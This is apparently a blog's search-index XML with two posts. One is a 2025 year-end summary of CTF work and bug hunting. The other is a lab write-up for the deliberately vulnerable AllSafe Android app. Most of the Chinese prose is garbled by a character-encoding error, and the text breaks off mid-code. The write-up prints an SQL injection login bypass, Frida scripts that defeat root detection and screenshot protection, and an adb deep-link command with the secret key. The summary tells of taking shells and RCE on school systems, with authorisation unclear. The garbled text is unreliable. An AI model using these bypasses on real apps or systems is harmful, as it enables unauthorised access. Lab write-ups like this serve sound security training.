<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>å¹´ç»ˆæ€»ç»“</title>
    <link href="/2025/12/28/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2025/12/28/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="å¹´ç»ˆæ€»ç»“"><a href="#å¹´ç»ˆæ€»ç»“" class="headerlink" title="å¹´ç»ˆæ€»ç»“"></a>å¹´ç»ˆæ€»ç»“</h1><blockquote><p>ä»Šå¹´ç»ˆäºåƒæ˜¯ä¸ªäººäº†ï¼Œå†™ä¸ªå¹´ç»ˆæ€»ç»“å§</p></blockquote><h1 id="2025-1"><a href="#2025-1" class="headerlink" title="2025.1"></a>2025.1</h1><p>å’Œæœ‹å‹ä¸€èµ·åŠäº†ä¸ª CTF æ¯”èµ›(ä»Šå¹´å·²ç»æ˜¯ç¬¬äºŒå±Šäº†)</p><p><img src="/img/RtnobbfKNo41JKxJNKAcJ3Irnxc.png"></p><p>è¿™æ¬¡å‡ºäº†å‡ ä¸ªå®‰å“é€†å‘çš„é¢˜ç›®ï¼Œå‡ºé¢˜çš„è¿‡ç¨‹ä¸­é¡ºä¾¿å­¦ä¹ äº†å®‰å“å¼€å‘å’Œ NDK å¼€å‘ï¼Œç„¶åå‘ç°ç”¨ C++ å’Œ Java å†™å‡ºåŒä¸€ä¸ªåŠ å¯†ç®—æ³•å¾ˆéš¾ï¼ŒAI Coding äº†åŠå¤©(ä¸»è¦é—®é¢˜æ˜¯åœ¨å¤„ç†é•¿å­—èŠ‚æµç¼–ç çš„é—®é¢˜ä¸Š)</p><p><img src="/img/Lo3Lbfq18o4zWlxSQg2cIqfFnwb.png"></p><p>å’Œæœ‹å‹åˆç§Ÿä¹°äº†ä¸‰ä¸ªæœˆ thmï¼Œåé¢æ”¾å‡çš„æ—¶å€™å°±åšäº†å¥½å¤šï¼Œæœ€åä¸€æ¬¡æ›´æ–°æ˜¯ 1.27(å¥½åƒè¿™å¤©åˆšå¥½åˆ°æœŸäº†)ï¼Œå®¶é‡Œç½‘ä¸å¥½åš thm è€æ‰çº¿ï¼Œåé¢åšçš„å°±ä¸å¤šäº†</p><p><img src="/img/XQkUbDaCZo9Sk9xD9UJcYKPEnkb.png"></p><p>å…¶ä»–æ—¶é—´å°±æ˜¯å’Œæœ‹å‹ä¸€èµ·æ‰“æ°¸åŠ«ï¼Œç“¦ï¼Œmcï¼Œå„ç§ç©ï¼Œè¿˜æ˜¯å¤§äºŒå¥½ï¼Œåƒå¥½å–å¥½ç©å¥½ï¼Œæ²¡æœ‰é¡¾è™‘</p><h1 id="2025-2"><a href="#2025-2" class="headerlink" title="2025.2"></a>2025.2</h1><p>æ²¡ thm äº†å°±è‡ªå·±æ­ä¸ªé¶åœºç©ï¼Œæ·±å…¥å­¦ä¹ ä¸€äº›åŸŸçš„çŸ¥è¯†</p><p><img src="/img/Bxlvb9lu4oUjNAx6L4XcQMuOnpe.jpg"></p><p>åé¢å¿«å¼€å­¦äº†ï¼Œä¸Šæ·˜å®åˆ¶ä½œäº†ä¸€äº›å»‰ä»·æ„Ÿåè¶³çš„å¥–æ¯(bushi),ï¼Œä½†æ˜¯æ”¶åˆ°å¥–æ¯çš„åŒå­¦è¿˜æ˜¯å¾ˆå¼€å¿ƒçš„</p><p><img src="/img/KnIMbCg1RoZ29ExSdI8cpD5Bnxd.jpg"></p><p>ğŸ¤­</p><p><img src="/img/FzlkbMJVSoXX8kxu6nbc6rLtnPd.jpg"></p><p><img src="/img/Jf0Db0ji8o1IGDxy1XqcR3ujn6d.jpg"></p><p>è¿™ä¸ªæœˆæœ‰ä¸€ä»¶éå¸¸é‡è¦çš„äº‹ï¼Œå½“æ—¶åŠå¤œå¸®æœ‹å‹åšäº†ä¸€ä¸ªé¢˜ï¼Œç»™äº†ä¸€ä¸ª emlog ç¯å¢ƒï¼Œæœäº†åŠå¤©æ²¡æœ‰å¯ç”¨çš„å†å² 1dayï¼Œæ‰€ä»¥è¿™é¢˜å°±æ˜¯è¦æŒ– 0dayï¼Œæ•´ä¸ªæ¯”èµ›è¿‡ç¨‹ä¹Ÿæ²¡å‡ ä¸ªé˜Ÿä¼åšå‡ºæ¥ï¼Œæç¤ºæ˜¯ä¼ªéšæœºæ•°ï¼Œä¹Ÿå°±æ˜¯ mt_seed é‚£ç©æ„ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯å›¾å½¢éªŒè¯ç ï¼Œå› ä¸ºä»–è°ƒç”¨äº†è¿™ä¸ªéšæœºæ•°ï¼Œä½†æ˜¯ç”Ÿæˆçš„æ•°å¤ªçŸ­äº†ï¼Œä¸å¥½é€†æ¨ï¼Œåé¢å‘ç°ä»–åˆå§‹åŒ–ä¸€ä¸ª cookie çš„æ—¶å€™ä¹Ÿè°ƒç”¨äº† mt_seedï¼Œå› ä¸ºä»–æœ‰ä¸¤ä»½ cookieï¼Œè€Œä¸”è¿ç»­è°ƒç”¨äº†è¯¥éšæœºæ•°ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ç¬¬äºŒä¸ªéšæœºæ•°å€’æ¨å‡ºç¬¬ä¸€ä¸ªçš„ seed</p><p><img src="/img/LpwabUcNOoVvo3x6gSbcyYONnLg.jpg"></p><p><img src="/img/HuuCb7gbeoYHM0xwN8AceKTindb.jpg"></p><p>ç”¨ä¹‹å‰çš„é¡¹ç›®çš„å€Ÿæ¬¾äº†ï¼Œç›´æ¥ä¸€ä¸¾æ‹¿ä¸‹ Mac Book Air 2020ï¼ˆä¸ºä»€ä¹ˆæ˜¯è½¬è½¬ï¼Ÿå› ä¸ºä¾¿å®œè¿˜æœ‰ä¿ä¿®ï¼Œå’¸é±¼æ›´ä¾¿å®œä½†ä¸æ•¢ä¹°ï¼‰</p><p><img src="/img/HxhvbClyroxKgbxVscKcnSKVnNh.jpg"></p><p>æ¢¦å¯ä»¥æ±‚çš„ MacğŸ˜</p><p><img src="/img/O96dbz7CMoPUKdx4OKXcOP3SnTe.jpg"></p><p>26 å·å…­çº§æˆç»©å‡ºæ¥äº†ï¼Œæ—©ä¸Šä¹Ÿæ²¡ç¡ç€ï¼Œèµ·æ¥æŸ¥æˆç»©äº†ï¼Œå¯æƒœå·®ä¸€é¢˜å°±è¿‡äº†ï¼Œä¸‹å­¦æœŸå†æˆ˜ ğŸ˜Ÿ</p><p><img src="/img/EzBNbtzUDo6jkWxi2fwcgcafnYe.png"></p><p>è¿™ä¸ªæœˆå°±å¼€å­¦äº†ï¼Œå¯’å‡æ—¶é—´æ¯”è¾ƒçŸ­</p><p>å¼€å­¦åå¸®ç§»åŠ¨æ‰“äº†ä¸ªçœå†…çš„ä¼—æµ‹ï¼Œæ²¡ä»€ä¹ˆæœ‰ç”¨çš„æˆæœï¼Œå¤§å¤šæ•°éƒ½æ˜¯çŸ­ä¿¡è½°ç‚¸ä¹‹ç±»çš„ï¼Œè¿˜æœ‰ç‚¹ xss å’Œè¶Šæƒï¼Œæœ€åå‘äº†ç‚¹å¥–é‡‘ï¼Œè¿˜ä¸é”™</p><h1 id="2025-3"><a href="#2025-3" class="headerlink" title="2025.3"></a>2025.3</h1><p>æ²¡å¹²ä»€ä¹ˆï¼Œå­¦å¼Ÿå‘äº†ä¸¤ä¸ªåå°ï¼Œéƒ½æ˜¯ asp.net ç³»ç»Ÿï¼Œçœ‹äº†ä¸€ä¸‹éšå³æ‹¿ä¸‹ä¸¤ä¸ª shell</p><p><img src="/img/BxYjb1qS9o114pxyUk6cvy3Znfc.png"></p><p><img src="/img/S4npblbgsoEIjmxNKLjcQpudnWg.png"></p><h1 id="2025-4"><a href="#2025-4" class="headerlink" title="2025.4"></a>2025.4</h1><p>è¿™ä¸ªæœˆå¼€å§‹æŒ– edusrcï¼Œæ¢¦æƒ³æ˜¯æ‰“ç©¿æ·®å·¥</p><p>ä¸Šæ¥å°±æŒ–äº†ä¸€ä¸ªå…¨æ ¡çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²</p><p><img src="/img/AgMPb5RZ7o3S4uxclRKcz2KRnec.jpg"></p><p><img src="/img/RQoXbagi1oteKgxIOuZccIWknYb.png"></p><p>ç„¶åæ‰“äº†ä¸ªæ—ç«™ï¼Œæ‹¿ä¸‹æ•™å¸ˆè´¦å·</p><p><img src="/img/JHtubQWDKoMkbcx3m5mcsxEenpK.png"></p><p>ç„¶åæ‘¸ç´¢äº†å‡ å¤©ï¼Œç»ˆäºåœ¨æ¯•è®¾ç³»ç»Ÿä¸Š RCE äº†ï¼ˆäººç”Ÿåœ†æ»¡äº†ï¼‰</p><p><img src="/img/VKOobZuheozWZ1xU9VTcDF0kn3f.png"></p><h1 id="2025-5"><a href="#2025-5" class="headerlink" title="2025.5"></a>2025.5</h1><p>å‡†å¤‡æŠ•å®ä¹ äº†ï¼Œä½†æ˜¯å¤§äºŒæ²¡äººè¦ï¼Œä¸æƒ³å» hwï¼Œå…ˆæŠ•ä¸ª 360 è¯•è¯•æ°´</p><p>è·Ÿå­¦å¼Ÿå»å¸®ç§»åŠ¨æ‰“å¸‚æŠ¤ï¼Œè¿™æ¬¡å¯ä»¥åœ¨è‡ªå·±å­¦æ ¡é‡Œæ‰“ï¼Œä¸ç”¨è·‘ä¸œè·‘è¥¿äº†ï¼Œä½†æ²¡ä»€ä¹ˆå‡†å¤‡ï¼Œäº¤çš„å¥½å¤šéƒ½æ˜¯æˆ‘ä¹‹å‰åœ¨ edu ä¸Šäº¤è¿‡çš„æ´ ï¼ˆæ·®å·¥çš„æ´çœŸæ˜¯ä¸€ç‚¹ä¸ä¿®å•Šï¼‰</p><p>æœˆåº•çš„æ—¶å€™ï¼Œ360 é¢è¿‡äº†ï¼Œå‘ offer äº†</p><p>äººç”Ÿç¬¬ä¸€ä»½ offer</p><p><img src="/img/CBhDb5Fujo2pqwxAmEWcSbtsnWc.jpg"></p><h1 id="2025-6"><a href="#2025-6" class="headerlink" title="2025.6"></a>2025.6</h1><p>ä¹‹å‰ edu æŒ–çš„è¯ä¹¦ä¹Ÿç»ˆäºå‘è´§äº†</p><p><img src="/img/TVxJbIep0oFtfJxCsIZcUylvnPl.jpg"></p><p>è·Ÿ HR çº¦çš„æ˜¯ 6.30 å°±åˆ°å²—ï¼ŒæœŸæœ«æ²¡è€ƒå®Œå°±è¦å»ä¸Šç­äº†</p><h1 id="2025-7"><a href="#2025-7" class="headerlink" title="2025.7"></a>2025.7</h1><p>å®é™…åˆ°å…¬å¸æ‰å‘ç°ï¼Œä¸€å¼€å§‹çš„å·¥ä½œå…¶å®å¹¶ä¸æ˜¯é‚£ä¹ˆå¤šï¼Œç¬¬ä¸€å‘¨æ„Ÿè§‰æ²¡ä»€ä¹ˆäº‹åšï¼Œè¿˜ä¸å¦‚å›å»è€ƒä¸ªè¯•</p><p><img src="/img/FZhfbSoaSoRsmtxR81Wce1ZBnPg.jpg"></p><p>é—²ä½™æ—¶é—´å°±è‡ªå·±å­¦å­¦ä¸œè¥¿ï¼ŒæŒ–æŒ–æ´ï¼Œä¸Šç­ç¬¬ä¸€å‘¨å°±æ‹¿äº†ä¸Šæµ·ä½“è‚²å¤§å­¦çš„è¯ä¹¦</p><p>åˆ°ä¸ƒæœˆä¸­æ—¬å°±æœ‰äº‹æƒ…åšäº†ï¼Œè·ŸåŒäº‹å»é‡‘ç§‘çœæŠ¤äº†ï¼Œä½†ä¸»è¦ä»»åŠ¡ä¸æ˜¯æŒ–æ´è€Œæ˜¯æµ‹è¯•å…¬å¸æ–°å¼€å‘çš„æ™ºèƒ½ä½“</p><p><img src="/img/TMPhbrAb3oMhOBxdxZAczIVmnOf.jpg"></p><p>å­¦æ ¡å®‰æ’çš„é…’åº—</p><p><img src="/img/UUz9brdMZoC2FLxCeBtcE0MWntc.jpg"></p><p>å±¯çš„é›¶é£Ÿ</p><p><img src="/img/DQOmbF1dzoFJJ1xtdxicdGmmnff.jpg"></p><p>è·Ÿ dozer ä¸€èµ·åƒé¥­ï¼ˆ è¯¯é—¯å¤©å®¶</p><p><img src="/img/VYplbleWqoKdJZxTOfNcqYGInNc.jpg"></p><p>åˆ°äº†å‘¨æœ«ï¼Œç»ˆäºèƒ½ä¸‹ä¸ªæ—©ç­äº†</p><p><img src="/img/EfQQb4A0Xo0Musx3CG7c3eGAnwg.jpg"></p><p><img src="/img/G6Aebjo5noAAz6x1ZLIcGHXVnvg.jpg"></p><p>å›åˆ°å…¬å¸åï¼Œå›é¡¾äº†ä¹‹å‰çœæŠ¤çš„æ¼æ´ï¼ŒæŒ–äº†ä¸ªæŸæŠ¥è¡¨çš„ 0dayï¼ˆç›®å‰è¿˜æœªå…¬å¼€ï¼‰ï¼Œåªåœ¨ç»„å†…çš„åˆ†äº«ä¼šä¸Šåˆ†äº«è¿‡</p><p><img src="/img/RK44b8sOJouM7NxDEU9cSDXVnUd.png"></p><h1 id="2025-8"><a href="#2025-8" class="headerlink" title="2025.8"></a>2025.8</h1><p>åˆšå¥½èµ¶ä¸Šäº† 360 20 å‘¨å¹´åº†</p><p>å¬è€å‘¨å¹ç‰›é€¼</p><p><img src="/img/XtaSbFhpho1HVaxv3Wrc1amFnAc.jpg"></p><p>åƒè›‹ç³•</p><p><img src="/img/PA3VbguIQoJWDDx0zlYcVAYenwg.jpg"></p><p>å‰å°</p><p><img src="/img/I4gUbJL38olUC8xPIWQc5wWmndd.jpg"></p><p>16 å·å‡ºå…­çº§æˆç»©äº†ï¼Œè¿™æ¬¡ç»ˆäºè¿‡äº†</p><p><img src="/img/Sm5cbYKnjoJWBKxKU53coMEBnXb.jpg"></p><p>ç»„å†…èšé¤</p><p><img src="/img/QfgYbscekoDl8cx8zG2caUH6nxb.jpg"></p><h1 id="2025-9"><a href="#2025-9" class="headerlink" title="2025.9"></a>2025.9</h1><p>å›å­¦æ ¡è¡¥è€ƒäº†ï¼Œå®éªŒå®¤ä¾æ—§ç©ºæ— ä¸€äºº</p><p><img src="/img/PkMdbIiahonwdNx0QvxcCuXgnWf.jpg"></p><p>è·ŸåŒå­¦å’Œå³°å“¥èšé¤</p><p><img src="/img/OPJmb50qLosa1Lx1EMpctoyWn6d.jpg"></p><p>é¥­åç¬¬äºŒåœºæ‰“å°çƒ</p><p><img src="/img/YFrtbTc75oWuJEx6iRYc1o1inVh.jpg"></p><p><img src="/img/GgrDb0jhRoujBgxlN5VcZl6FnGg.jpg"></p><p>è€ƒå®Œè¯•åˆå›å…¬å¸å¹²æ´»äº†ï¼Œæœˆåº•çš„æ—¶å€™ç¦»èŒäº†ç„¶åå»å‚åŠ äº†ä¸€ä¸ªç§»åŠ¨çš„ ctf æ¯”èµ›</p><p><img src="/img/FRFnbMXopoFLpMxv86ncYdAXn9g.jpg"></p><h1 id="2025-10"><a href="#2025-10" class="headerlink" title="2025.10"></a>2025.10</h1><p>çŒ›æ”» edusrc</p><p><img src="/img/XuH6bJ3FloNXJVxwjIDc1fWPnrg.png"></p><p>å‡‘å¤Ÿ 200rank ååŠ å…¥æ¸Šé¾™</p><p><img src="/img/WXG2bFTXvoehGYxwMLPclwjLncf.png"></p><p>é¡ºä¾¿æŒ–äº†ä¸ªä¸¥é‡é€šæ€</p><p><img src="/img/GudPblXA6oOcIzx8AWPc9wf7nge.png"></p><h1 id="2025-11"><a href="#2025-11" class="headerlink" title="2025.11"></a>2025.11</h1><p>å·²ç»æŒ–çš„å·®ä¸å¤šäº†ï¼Œåˆæ¥ç€æŒ–äº†ä¸€äº›ï¼Œé¡ºä¾¿åˆæŒ–äº†å‡ ä¸ªé€šæ€</p><p><img src="/img/Gizybjs1ho01dHxYIEActxVan3e.png"></p><h1 id="2025-12"><a href="#2025-12" class="headerlink" title="2025.12"></a>2025.12</h1><p>æ‘†çƒ‚ä¸€ä¸ªå¤šæœˆäº†ï¼Œç»ˆäºå¼€å§‹å»æ‰¾å®ä¹ äº†ï¼Œä½†æ˜¯ 12 æœˆä»½å·²ç»å¾ˆæ™šäº†ï¼Œboss éƒ½æ˜¯ç›´æ¥ä¸å›ï¼Œé‚®ç®±æŠ•äº†ä¸¤ä»½</p><p><img src="/img/SOOubLhnnogRc9xC0vtcnGbhn4f.png"></p><p>æœ€ç»ˆåªæœ‰ mk ç»™äº†é¢è¯•</p><p><img src="/img/JQLybTXYGonnbdxW1s9cNIGFnde.png"></p><p>æœ€ç»ˆå¥½åœ¨é¢è¿‡äº†ï¼Œå…ˆæ‰“äº†ä¸ªç”µè¯ï¼Œç»™äº†å£å¤´ offer</p><p>æœ‹å‹ä¹Ÿå»é¢äº†ï¼Œè®°å½•äº†ä¸€äº›é¢è¯•çš„é—®é¢˜</p><p><img src="/img/TwXHb5KN8oT2u9xhRCJc1th4n6f.png"></p><hr><h2 id="ğŸ“„-è®¸å¯è¯"><a href="#ğŸ“„-è®¸å¯è¯" class="headerlink" title="ğŸ“„ è®¸å¯è¯"></a>ğŸ“„ è®¸å¯è¯</h2><p>æœ¬æ–‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International (CC BY 4.0)</a> è®¸å¯è¯ã€‚</p><p>è¿™æ„å‘³ç€ä½ å¯ä»¥è‡ªç”±åœ°ï¼š</p><ul><li><strong>åˆ†äº«</strong> â€” ä»¥ä»»ä½•åª’ä»‹æˆ–æ ¼å¼å¤åˆ¶åŠåˆ†å‘æœ¬ææ–™</li><li><strong>æ”¹ç¼–</strong> â€” é‡æ··ã€è½¬æ¢å’ŒåŸºäºæœ¬ææ–™åˆ›ä½œï¼Œé€‚ç”¨äºä»»ä½•ç›®çš„ï¼ŒåŒ…æ‹¬å•†ä¸šç”¨é€”</li></ul><p>åœ¨ä»¥ä¸‹æ¡ä»¶ä¸‹ï¼š</p><ul><li><strong>ç½²å</strong> â€” ä½ å¿…é¡»ç»™å‡ºé€‚å½“çš„ç½²åï¼Œæä¾›æŒ‡å‘æœ¬è®¸å¯è¯çš„é“¾æ¥ï¼ŒåŒæ—¶æ ‡æ˜æ˜¯å¦ä½œå‡ºäº†ä¿®æ”¹</li></ul>]]></content>
    
    
    <categories>
      
      <category>æ€»ç»“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¹´ç»ˆæ€»ç»“</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>allsafe WP</title>
    <link href="/2025/12/18/allsafe-WP/"/>
    <url>/2025/12/18/allsafe-WP/</url>
    
    <content type="html"><![CDATA[<h1 id="AllSafe"><a href="#AllSafe" class="headerlink" title="AllSafe"></a>AllSafe</h1><blockquote><p><a href="https://github.com/t0thkr1s/allsafe-android">https://github.com/t0thkr1s/allsafe-android</a></p></blockquote><h1 id="Insecure-Logging"><a href="#Insecure-Logging" class="headerlink" title="Insecure Logging"></a>Insecure Logging</h1><p><strong>æœ‰æ—¶å€™ logcat ä¸­ä¼šç›´æ¥è¾“å‡ºæ˜æ–‡çš„æ•æ„Ÿä¿¡æ¯å†…å®¹</strong></p><p>è·å– app è¿›ç¨‹ pid</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell <span class="hljs-string">&#x27;pidof infosecadventures.allsafe&#x27;</span><br></code></pre></td></tr></table></figure><p>ç›‘è§†ç›®æ ‡è¿›ç¨‹çš„ logcat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell <span class="hljs-string">&#x27;logcat --pid [PID] | grep secret&#x27;</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥å¯ä»¥æ‰“å°å‡ºç”¨æˆ·è¾“å…¥çš„æ˜æ–‡å¯†ç </p><p><img src="/img/I8MEb0BfHo65ToxsVf2cmEElnic.png"></p><h1 id="Hardcoded-Credentials"><a href="#Hardcoded-Credentials" class="headerlink" title="Hardcoded Credentials"></a>Hardcoded Credentials</h1><p>ç¡¬ç¼–ç æ•æ„Ÿä¿¡æ¯</p><p><img src="/img/FCw0bcx9Bo5adWxybQ1cuptynTe.png"></p><h1 id="Firebase-Database"><a href="#Firebase-Database" class="headerlink" title="Firebase Database"></a>Firebase Database</h1><p>åç¼–è¯‘å‘ç°ä»–ä¼šå°è¯•å»è®¿é—® firebase çš„ secret èŠ‚ç‚¹</p><p><img src="/img/Sx1dbBWzaohO2HxYceQcwR6Cnxf.png"></p><p>å¯ä»¥åœ¨ FirebaseOptions ç±»ä¸­çœ‹åˆ°é…ç½®çš„å®šä¹‰</p><p><img src="/img/WdQxb5t6gogSWFxHJETc09F5ntc.png"></p><p>ä» res ä¸­è¯»å–é…ç½®æ–‡ä»¶</p><p><img src="/img/GHA7beXtboPTKLximQ4ctNgxnYu.png"></p><h1 id="Insecure-Shared-Preferences"><a href="#Insecure-Shared-Preferences" class="headerlink" title="Insecure Shared Preferences"></a>Insecure Shared Preferences</h1><p>Shared Preferences ä¼šåœ¨æœ¬åœ°å­˜å‚¨ä¸€äº›æ•°æ®ï¼Œæ¯”å¦‚ç¼“å­˜ç”¨æˆ·çš„è´¦æˆ·å¯†ç </p><p>è¾“å…¥ä¸€éè´¦æˆ·å¯†ç å</p><p><img src="/img/T6iGbKqLsoTpQax97CZcyJYlnxc.png"></p><p>å¯ä»¥åœ¨ app çš„ data ç›®å½•ä¸‹æ‰¾åˆ°å­˜å‚¨çš„ç”¨æˆ·ä¿¡æ¯</p><p><img src="/img/PO4Ub3gLqoAHPaxdArscNhvNnwc.png"></p><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>å¾ˆå¤š app æœ¬åœ°ä¼šé‡‡ç”¨ Sqlite ä½œä¸ºæ•°æ®åº“ï¼Œå­˜å‚¨ç”¨æˆ·ä¿¡æ¯ï¼Œæ¼æ´åŸç†è·Ÿæ™®é€šçš„ web ä¸Šçš„ sql æ³¨å…¥åŒç†</p><p><img src="/img/G1pJbrR37oUB1MxDebJcLhfXnkd.png"></p><p>user è¡¨ä¸­è¿˜å­˜å‚¨äº†å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¯ä»¥ç›´æ¥æ³¨å‡ºæ¥</p><p><img src="/img/MVd4baT4HoFj22xRI24cCoR2nVh.png"></p><p>ç›´æ¥ä¸‡èƒ½å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27; or 1=1 --</span><br></code></pre></td></tr></table></figure><p><img src="/img/Rq1rb7V1Horc6ZxSCkWcvgXVnid.png"></p><h1 id="PIN-Bypass"><a href="#PIN-Bypass" class="headerlink" title="PIN Bypass"></a>PIN Bypass</h1><p>ç›´æ¥åç¼–è¯‘å°±èƒ½çœ‹åˆ° PIN ç </p><p><img src="/img/Pe0jbeH2Vo595XxG5bkcBK42n6n.png"></p><p>ç›´æ¥å°±è§£å‡ºæ¥äº†</p><p><img src="/img/FzGYbcnY3oMPl2x7SY0cO803n9g.png"></p><p><img src="/img/Y9bKbHh8oo2PvvxoWDUcvygsnAh.png"></p><h1 id="Root-Detection"><a href="#Root-Detection" class="headerlink" title="Root Detection"></a>Root Detection</h1><p>å¾ˆå¤š app ä¼šæ£€æµ‹ Root ç¯å¢ƒ</p><p><img src="/img/HPosbs1x7oG1uExq1TWcJqMUnGc.png"></p><p>é€šè¿‡è°ƒç”¨ <strong>RootBeer</strong> ç±»çš„ <strong>isRooted æ–¹æ³•æ£€æµ‹</strong>æ˜¯å¦ Root</p><p><img src="/img/BB3jbpcLooG7pIxL1vJcj1CvnwC.png"></p><p>ç”¨ frida ç‰¹åˆ«å®¹æ˜“ç»•è¿‡ï¼Œç›´æ¥è®© <strong>isRooted è¿”å› false å³å¯</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-title class_">RootBeer</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.scottyab.rootbeer.RootBeer&quot;</span>);<br><span class="hljs-title class_">RootBeer</span>[<span class="hljs-string">&quot;isRooted&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`RootBeer.isRooted is called`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p>æˆåŠŸç»•è¿‡æ£€æµ‹</p><p><img src="/img/EuiJbHqnuomudIx7VztcQe8Fnzb.png"></p><h1 id="Secure-Flag-Bypass"><a href="#Secure-Flag-Bypass" class="headerlink" title="Secure Flag Bypass"></a>Secure Flag Bypass</h1><p>å½“å‰åº”ç”¨ä¸å…è®¸æˆªå›¾</p><p><img src="/img/MeQCb5nsJoGuYexmqlactgcDnTf.png"></p><p>å›åˆ° MainActivityï¼Œå¯ä»¥çœ‹åˆ°å…¶è®¾ç½®äº† <strong>FLAG_SECURE</strong><strong>ï¼Œé»˜è®¤å€¼ä¸º 8192 ï¼Œæ‰€ä»¥å¯¼è‡´æˆ‘ä»¬ä¸èƒ½æˆªå›¾</strong></p><p><img src="/img/WPNYbKqlsovwzZxqdrOcH4ofn2d.png"></p><p><img src="/img/Q3aIbPSu9ouyQMxwmGCcvyHbnOb.png"></p><p>åªæ˜¯ä»£ç å±‚é¢çš„é˜²æŠ¤ï¼Œç›´æ¥ hook æ‰å°±è¡Œäº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Java.perform(<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br><span class="hljs-built_in">let</span> Window  = Java.use(<span class="hljs-string">&quot;android.view.Window&quot;</span>);<br>Window[<span class="hljs-string">&quot;setFlags&quot;</span>].implementation = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    console.log(`setFlags.isRooted is called`);<br>    <span class="hljs-built_in">return</span> this.setFlags(1, 1);<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p>æˆåŠŸæˆªå›¾</p><p><img src="/img/LaZibA6I5oBNqgxlzUZcWkCinyh.png"></p><h1 id="Deep-Link-Exploitation"><a href="#Deep-Link-Exploitation" class="headerlink" title="Deep Link Exploitation"></a>Deep Link Exploitation</h1><p>æŸ¥çœ‹ manifest æ–‡ä»¶ï¼Œå®šä¹‰äº†ä¸¤ä¸ª deeplinkï¼š</p><p><img src="/img/Jn8Fb7ISno6omVx7oQwc8pssnLd.png"></p><p>ä» Intent çš„ Uri ä¸­è·å– <code>key</code> å‚æ•°ï¼Œåˆ¤æ–­å…¶æ˜¯å¦ç­‰äº <code>R.string.key</code></p><p><img src="/img/NRaYbmyItoNrfdx6lZUcVAQwnRh.png"></p><p>åœ¨ <strong>res&#x2F;values&#x2F;strings.xml</strong> ä¸­æŸ¥æ‰¾ key çš„å€¼ä¸º <code>ebfb7ff0-b2f6-41c8-bef3-4fba17be410c</code></p><p><img src="/img/CKa0bXKbfoYRXnxwyemcRTk2nuf.png"></p><p>å› ä¸ºå®šä¹‰äº† <code>intent-filter</code> ä½¿ç”¨ adb éšå¼ Intent å¯åŠ¨è¯¥ activity</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">adb shell am start -a android.intent.action.VIEW -d <span class="hljs-string">&quot;allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/W9Leb9YcCo2aJXxd1rncLe9Ynob.png"></p><h1 id="Insecure-Broadcast-Receiver"><a href="#Insecure-Broadcast-Receiver" class="headerlink" title="Insecure Broadcast Receiver"></a>Insecure Broadcast Receiver</h1><p>ç”¨æˆ·è¾“å…¥ä¸€æ®µæ–‡æœ¬åï¼Œç‚¹å‡» â€œSaveâ€ æŒ‰é’®åï¼Œåˆ›å»ºä¸€ä¸ª éšå¼ Intentï¼ŒAction ä¸º <code>&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot;</code></p><p><img src="/img/RpvmbaWcKocupBxFe4EcW4D2nOd.png"></p><p>å› ä¸º Android8 ä¹‹åçš„ç‰ˆæœ¬å¹¿æ’­æ¥æ”¶å™¨æ¥æ”¶ä¸åˆ°éšå¼ Intent å‘é€çš„å¹¿æ’­ï¼Œæ‰€ä»¥ä»–è¿™é‡Œé‡‡ç”¨äº† <code>PackageManager</code> éå†ç³»ç»Ÿä¸­æ‰€æœ‰çš„å¹¿æ’­æ¥æ”¶å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PackageManager</span> <span class="hljs-variable">packageManager</span> <span class="hljs-operator">=</span> requireActivity().getPackageManager();<br>List&lt;ResolveInfo&gt; resolveInfos = packageManager.queryBroadcastReceivers(intent, <span 